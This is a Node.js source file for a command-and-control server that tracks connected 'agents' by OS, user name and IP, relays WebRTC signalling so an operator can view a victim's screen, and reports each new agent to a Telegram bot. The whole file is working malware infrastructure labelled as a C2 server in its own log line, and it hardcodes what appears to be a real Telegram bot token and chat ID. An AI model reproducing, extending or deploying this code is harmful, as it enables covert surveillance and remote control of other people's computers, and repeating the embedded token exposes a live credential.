const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

// Persistence: Keep track of ALL known users, even if offline
let knownUsers = {}; 
let clients = {}; // Only active connections

// Telegram Spam Protection: 3 hours cooldown
const tgCooldown = {}; 
const TG_COOLDOWN_MS = 3 * 60 * 60 * 1000; 

// --- HELPER FUNCTIONS ---

function logToFile(msg) {
    const timestamp = new Date().toISOString();
    const line = `[${timestamp}] ${msg}`;
    console.log(line);
    broadcastLogToAdmins(line);
}

function notifyTelegram(msg) {
    // Check cooldown
    const now = Date.now();
    // Simple cooldown check: if we sent a message to this chat recently, skip
    // Note: This is a simple global cooldown for alerts to prevent spamming the same alert type too fast
    // For per-user cooldown, we'd need a more complex map. 
    // Given the request "stopped for some hours", let's implement a per-user cooldown.
    
    // We will rely on the caller to pass a unique key (like user ID)
    // But for simplicity, let's just throttle general alerts if needed.
    // Actually, let's implement per-user cooldown here.
    
    // If msg contains user ID, use it as key
    const userIdMatch = msg.match(/ID:\s*(\w+)/);
    const cooldownKey = userIdMatch ? userIdMatch[1] : 'global_tg_alert';
    
    if (tgCooldown[cooldownKey] && (now - tgCooldown[cooldownKey]) < TG_COOLDOWN_MS) {
        return; // Skip sending
    }
    
    tgCooldown[cooldownKey] = now;

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
    require('https').get(url, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
            if (res.statusCode !== 200) {
                logToFile(`[TG ERROR] Status: ${res.statusCode}, Body: ${data}`);
            }
        });
    }).on('error', (e) => {
        logToFile(`[TG ERROR] ${e.message}`);
    });
}

function notifyAdmin(id, msg) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
        }
    });
}

function broadcastToAdmin(sourceId, data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ targetId: sourceId, ...data }));
        }
    });
}

function broadcastLogToAdmins(line) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN && client.isAdmin) {
            client.send(JSON.stringify({ type: 'system_log', message: line }));
        }
    });
}

// --- HTTP ROUTING ---
app.use(express.static(__dirname)); 

// Serve admin.html if accessed directly, but we might want to inject dynamic JS if needed
// For now, we assume admin.html is served statically. 
// However, to ensure the UI works, we need to make sure the server sends the correct initial state if possible.
// Since admin.html is static, it relies on WS. We just need to ensure the WS logic is correct.

app.get('/', (req, res) => {
    res.redirect('/admin.html');
});

app.get('/health', (req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('OK');
});

// --- WEBSOCKET HANDLING ---
wss.on('connection', (ws, req) => {
    let id = uuidv4().substr(0, 8);
    ws.id = id;
    clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

    logToFile(`[+] Client Connected: ${id}`);
    ws.send(JSON.stringify({ type: 'registered', id: id }));

    let pingInterval = setInterval(() => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.ping();
        } else {
            clearInterval(pingInterval);
        }
    }, 25000);

    ws.on('message', (msgRaw) => {
        try {
            const data = JSON.parse(msgRaw);
            logToFile(`[MSG] Received from ${id}: ${data.type}`);

            if (data.type === 'register_admin') {
                clients[id].isAdmin = true;
                logToFile(`[ADMIN] Connected with ID: ${id}`);
                
                // Send existing known users to the new admin so they aren't empty
                Object.keys(knownUsers).forEach(uid => {
                    ws.send(JSON.stringify({ 
                        type: 'info', 
                        id: uid, 
                        os: knownUsers[uid].info.os, 
                        user: knownUsers[uid].info.user, 
                        ip: knownUsers[uid].info.ip 
                    }));
                });
                return;
            }

            if (data.type === 'info') {
                // Update both active client and known users
                clients[id].info = data;
                clients[id].lastSeen = Date.now();
                
                knownUsers[id] = { 
                    info: data, 
                    lastSeen: Date.now(), 
                    status: 'Online' 
                };

                notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
                broadcastToAdmin(id, data);
                
                // Notify Telegram with cooldown
                notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
            } 
            else if (data.type === 'heartbeat') {
                clients[id].lastSeen = Date.now();
                knownUsers[id] = knownUsers[id] || {};
                knownUsers[id].lastSeen = Date.now();
                knownUsers[id].status = 'Online';
            } 
            else if (['offer', 'answer', 'candidate'].includes(data.type)) {
                // Forward signaling data to the specific target
                if (data.targetId && clients[data.targetId]) {
                    const targetWs = clients[data.targetId].ws;
                    if (targetWs.readyState === WebSocket.OPEN) {
                        targetWs.send(JSON.stringify(data));
                    }
                }
            } 
            else if (data.type === 'join_all') {
                // Broadcast join request to all other agents
                Object.keys(clients).forEach(cid => {
                    if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
                        clients[cid].ws.send(JSON.stringify({
                            type: 'join_request',
                            from: id,
                            timestamp: Date.now()
                        }));
                    }
                });
            } 
            else if (data.type === 'request_join') {
                // Admin requests to join a specific payload
                const targetId = data.targetId;
                if (clients[targetId]) {
                    clients[targetId].ws.send(JSON.stringify({
                        type: 'join_request',
                        from: id,
                        timestamp: Date.now()
                    }));
                    logToFile(`[ADMIN] Requested join to ${targetId}`);
                }
            }
            else {
                // Generic fallback
                if (!clients[id].info && !clients[id].isAdmin) {
                    knownUsers[id] = knownUsers[id] || {};
                    knownUsers[id].info = knownUsers[id].info || { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
                    notifyAdmin(id, `📺 Screen Active: ${id}`);
                }
                broadcastToAdmin(id, data);
            }
        } catch (e) {
            logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
        }
    });

    ws.on('close', () => {
        delete clients[id];
        
        // Update known users status
        if (knownUsers[id]) {
            knownUsers[id].status = 'Offline';
            knownUsers[id].lastSeen = Date.now();
        }
        
        notifyAdmin(id, '🔴 User Disconnected');
        notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
        logToFile(`[-] Client Disconnected: ${id}`);
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    logToFile(`C2 Server running on port ${PORT}`);
});
